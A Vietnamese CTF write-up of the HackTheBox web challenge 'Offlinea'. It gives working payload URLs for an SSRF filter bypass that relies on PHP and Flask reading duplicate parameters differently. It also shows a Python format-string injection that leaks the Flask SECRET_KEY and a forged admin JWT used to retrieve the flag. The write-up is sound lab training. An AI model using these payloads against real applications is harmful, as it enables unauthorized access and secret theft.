---
layout: single
title: "Offlinea"
date: 2026-03-31 17:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, SSRF, SSTI , Challenge ,Hackthebox]
---
# Offlinea - Easy - Web

## Tổng quan
Đây là một web challenge kết hợp PHP front-end và Flask/Selenium back-end. Luồng chính là người chơi nhập URL, name và secret ở giao diện ngoài; PHP sẽ kiểm tra URL cơ bản để chống SSRF rồi chuyển tiếp request sang Flask để mở trang bằng Chrome headless, xuất PDF và ghi lại lịch sử vào SQLite. 

```text
├── /index.html
│   └── GET  [guest]  - Trang giao diện chính
├── /bartender.php
│   └── GET  [guest]  - Front-end PHP nhận URL, kiểm tra rồi forward sang backend
├── /generate
│   └── GET  [guest/internal] - Selenium mở URL, export PDF, lưu name/secret vào DB
├── /logs
│   └── GET  [guest]  - Hiển thị history từ SQLite
└── /bartender
    └── GET  [token]   - Trả về secrets nếu JWT hợp lệ
```

Challenge này gồm 2 bug chain lại: SSRF + SSTI -> leak secret key để lấy flag.

## SSRF 
Mặc dù `PHP` đã check để chống SSRF khá chặt bằng cách sử dụng ip_list và Flask đã tính `ttl` để chống DNS Rebinding, tuy nhiên dựa vào hành vi khác nhau giữa PHP và Flask, ta vẫn có thể bypass qua để SSRF được.

Ví dụ khi gửi request GET : 
```
http://<IP>:<PORT>/bartender.php?url=http://A.com&url=http://B.com&secret=s&name=a
```
Trong PHP:
```php
$_GET['url']
```
Sẽ lấy param cuối cùng, tức là `http://B.com`.

Tuy nhiên với Flask:
```python
url = request.args.get('url')
```
Sẽ trả về giá trị đầu tiên, tức `http://A.com`.

Kết hợp với việc mỗi bên chỉ check 1 loại mà không check đồng thời 2 điều kiện IP_LIST và TTL nên ta có thể bypass qua để khai thác SSRF.

## SSTI
Sau khi đọc src code, phát hiện ở backend đã sử dụng hàm `format()` - là 1  hàm dễ gây SSTI khi truyền vào untrusted data.

Đoạn code gây lỗi:
```python
history = [f"ID: {row[0]} | URL: {row[1]} | Timestamp: {row[2]}" for row in rec]
history_1 = row_separator.join(history)

log = history_1.format(logify=logify)  # VULNERABLE!
```
Hàm `.format()` trong python không chỉ replace text đơn giản,mà còn cho phép truy cập attribute/gọi method gián tiếp. Ta có thể khai thác SSTI ở đây để lấy được `SECRET_KEY` bằng cách gọi `{logify.__globals__[app].config[SECRET_KEY]}`.

Ok đã lấy được `SECRET_KEY`,ta có thể lợi dùng `/logs` để log secret key vào pdf:
```
http://<HOST>:<PORT>/bartender.php?url=http://127.0.0.1:5000/logs?secret=http://127.0.0.1:5000/logs?secret={logify.__globals__[app].config[SECRET_KEY]}&url=https://example.com&secret=test&name=test
```
Đọc file pdf trả về để lấy secret key:
```python
# VD: 
http://127.0.0.1:5000/logs?secret=http://127.0.0.1:5000/logs?secret=<SECRET_KEY>
```
Vì flag được lưu ở secret của user `oldest_user_of_bartender`:
```python
query ="INSERT INTO secrets (name, secret) VALUES (?, ?)"
values = ('oldest_user_of_bartender', read_flag())
```

Nên sau khi lấy được secret key,sign JWT :
```json
{
        'is_admin': True,
        'username': 'oldest_user_of_bartender'
    }
```
Tiếp tục sử dụng bug SSRF để gửi jwt đến `/bartender` để lấy flag:
```
http://<HOST>:<PORT>/bartender.php?url=http://127.0.0.1:5000/bartender?token=<JWT_Token>&url=https%3A%2F%2Fexample.com&secret=test&name=test
```
Mở file pdf để lấy flag:
```json
{"secrets":[{"name":"oldest_user_of_bartender","secret":"HTB{Redacted}"},{"name":"test","secret":"test"},
{"name":"test","secret":"test"},{"name":"test","secret":"test"},{"name":"test","secret":"test"},{"name":"test","secret":"test"}]}
```